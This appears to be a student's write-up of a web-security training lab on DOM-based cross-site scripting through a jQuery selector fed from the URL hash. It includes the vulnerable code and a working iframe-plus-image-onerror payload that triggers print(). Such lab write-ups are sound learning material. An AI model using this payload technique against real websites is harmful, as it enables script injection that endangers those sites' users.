# Lab 6: DOM XSS in jQuery selector sink using a hashchange event

---

## 🎯 Mission Description  
This lab has a DOM XSS vulnerability because it uses jQuery's `$()` selector with data taken directly from `location.hash` without sanitization. The vulnerable jQuery version interprets injected HTML, allowing arbitrary JavaScript execution when the hash changes.

---

## 🎯 Mission Objective  
Trigger the `print()` function in the victim's browser.

---

## 🧪 Steps (My Approach)

1. 🔍 Viewed the source code and found:

   ```javascript
   $(window).on('hashchange', function(){
       var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
       if (post) post.get(0).scrollIntoView();
   });

→ This takes whatever is after the # in the URL, decodes it, and places it inside the :contains() selector. jQuery 1.8.2 will treat HTML in the selector as actual DOM elements.

    ❌ First try (direct injection in hash):

    https://LAB-ID.web-security-academy.net/#<img src=x onerror=print()>

    Result:
    Code didn’t execute immediately because the event only fires when the hash changes after page load.

    ✅ Working approach:

        Use an <iframe> to load the page with a harmless hash.

        On the iframe’s onload, append the malicious payload to src, causing a hash change and triggering the vulnerable code.

✅ Final Payload

 ```javascript
<iframe src="https://LAB-ID.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>"
 ```
🔎 Which results in:

```javascript
<section class="blog-list">
    <h2><img src="x" onerror="print()"></h2>
</section>
```
💥 print() executes as soon as the hashchange event fires.
🧠 Notes

    Vulnerability is due to unsafe use of user input inside jQuery selectors.

    Old jQuery versions (< 3.5.0) can interpret injected HTML in selectors.

    Payload only triggers when the hash actually changes, hence the need for the iframe trick.

✅ Status: Solved 🎉
